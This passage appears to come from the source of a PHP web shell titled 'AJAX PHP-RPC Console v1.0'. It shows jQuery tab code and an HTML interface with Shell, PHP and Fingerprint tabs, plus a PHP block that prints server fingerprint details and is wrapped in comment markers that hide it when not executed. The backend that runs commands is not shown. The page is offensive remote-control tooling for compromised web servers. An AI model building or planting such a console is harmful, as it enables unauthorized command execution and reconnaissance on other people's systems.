        $("#console_tabs > ul").tabs({
          fx: { height: 'toggle' },
          show: function(ui) {
            $("input", ui.panel).focus();
          }
        });
        $("#console_title").hide();

        $("#console_title").fadeIn(1300, function() {
          $("#console_shell").terminalFocus();
        });
      });
    </script>
  </head>

  <body>
    <div id="console_container">
      <h1 id="console_title">AJAX PHP-RPC Console v1.0</h1>

      <div id="console_content">
        <div id="console_tabs">
          <ul>
            <li><a href="#console_shell"><span>Shell</span></a></li>
            <li><a href="#console_php"><span>PHP</span></a></li>
            <li><a href="#console_fingerprint"><span>Fingerprint</span></a></li>
          </ul>

          <div id="console_shell" class="console_tab"></div>

          <div id="console_php" class="console_tab"></div>

          <div id="console_fingerprint" class="console_tab">
            <div class="console_dialogue">
              <!--
<?php
  echo(" -->");

  $info = fingerprint();

  foreach($info as $name => $value)
  {
    echo("<p><strong>" . str_replace('_', ' ', $name) . ":</strong> $value</p>\n");
  }

  echo("<!-- ");
?>
              -->

            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
